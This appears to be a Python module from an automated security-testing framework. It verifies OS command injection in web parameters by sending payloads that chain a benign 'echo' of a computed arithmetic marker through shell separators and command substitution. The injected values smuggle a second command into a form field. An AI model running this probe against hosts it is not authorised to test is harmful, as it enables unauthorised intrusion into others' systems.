"""Command-injection / RCE oracle — proves OS command *execution* over the web.

This is the web foothold primitive: if a parameter reaches a shell, an attacker
runs commands on the host. We prove *execution*, never mere reflection, the way
we prove SSTI — inject a command whose OUTPUT is a computed value the input does
not contain, bracketed by unique guards. We send ``…;echo <g>$((A*B))<g>`` and
confirm ``<g><A*B><g>`` comes back: the shell must have evaluated ``$((A*B))``,
because the raw payload carries ``$((A*B))``, not its product. A page that merely
echoes our input therefore fails; only real execution passes.

The injected command is benign (``echo`` of a computed marker) and we read only
our own marker — never target data, nothing destructive. Proving code execution
is confirmation; *weaponising* it into a persistent reverse shell / C2 beacon is
the gated Phase-C foothold path, not this oracle.

Separators cover the common shells/contexts (``;`` ``|`` ``&&`` newline, plus
``$(…)`` / backtick command substitution). Extra fixed fields a target form needs
(other params / hidden inputs) ride in ``metadata['params']`` / ``metadata['data']``.
"""

from __future__ import annotations

import hashlib
from typing import Any

from ...schemas.findings import Finding
from ...schemas.tools import ToolProfile
from ...toolrunner.wrappers.http_probe import HttpProbeWrapper
from ..context import VerifyContext
from .base import Oracle, OracleResult

_A, _B = 9091, 9067
_PRODUCT = str(_A * _B)  # 82428097 — computed by the shell, absent from the input


def _payloads(base: str, guard: str) -> tuple[str, ...]:
    """Injection payloads whose executed output is ``guard<product>guard``."""

    cmd = f"echo {guard}$(({_A}*{_B})){guard}"  # → guard82428097guard when run
    return (
        f"{base};{cmd}",
        f"{base}| {cmd}",
        f"{base}&& {cmd}",
        f"{base}\n{cmd}",
        f"$({cmd})",
        f"`{cmd}`",
    )


class CommandInjectionOracle(Oracle):
    oracle_id = "command_injection_oracle_v1"

    def handles(self, finding: Finding) -> bool:
        return finding.type.startswith(
            ("command-injection", "cmdi", "os-command", "rce")
        )

    def verify(self, finding: Finding, ctx: VerifyContext) -> OracleResult:
        md = finding.metadata
        param = md.get("param")
        if not param:
            return OracleResult(
                passed=False, oracle_id=self.oracle_id,
                detail="finding lacks an injection param in metadata",
            )
        guard = "aec" + hashlib.sha256(finding.id.encode()).hexdigest()[:8]
        expected = f"{guard}{_PRODUCT}{guard}"
        base = str(md.get("base_value", "127.0.0.1"))
        method = str(md.get("method", "GET")).upper()
        inject_key = "data" if method in ("POST", "PUT") else "params"

        extra_params: dict[str, Any] = dict(md.get("params") or {})
        extra_data: dict[str, Any] = dict(md.get("data") or {})
        base_args: dict[str, Any] = {
            "scheme": md.get("scheme", "http"),
            "port": md.get("port"),
            "path": md.get("path", "/"),
            "method": method,
        }
        evidence: list[str] = []
        vectors = _payloads(base, guard)

        for payload in vectors:
            params = dict(extra_params)
            data = dict(extra_data)
            (data if inject_key == "data" else params)[str(param)] = payload
            args = {**base_args}
            if params:
                args["params"] = params
            if data:
                args["data"] = data
            result = ctx.tool_runner.run("http_probe", finding.asset, ToolProfile(args=args))
            evidence.append(f"raw:{result.audit_id}")
            if HttpProbeWrapper.body_contains(result.raw, expected):
                return OracleResult(
                    passed=True, oracle_id=self.oracle_id,
                    detail=(
                        f"shell evaluated {_A}*{_B}={_PRODUCT} injected via param "
                        f"'{param}' (status {result.parsed.get('status')}) — "
                        "command execution proven"
                    ),
                    confidence=0.99, evidence=tuple(evidence),
                    measurements={"technique": "os-command-injection",
                                  "param": str(param), "payload": payload},
                )
        return OracleResult(
            passed=False, oracle_id=self.oracle_id,
            detail=(
                f"no command execution observed in '{param}' "
                f"across {len(vectors)} vectors"
            ),
            evidence=tuple(evidence),
        )
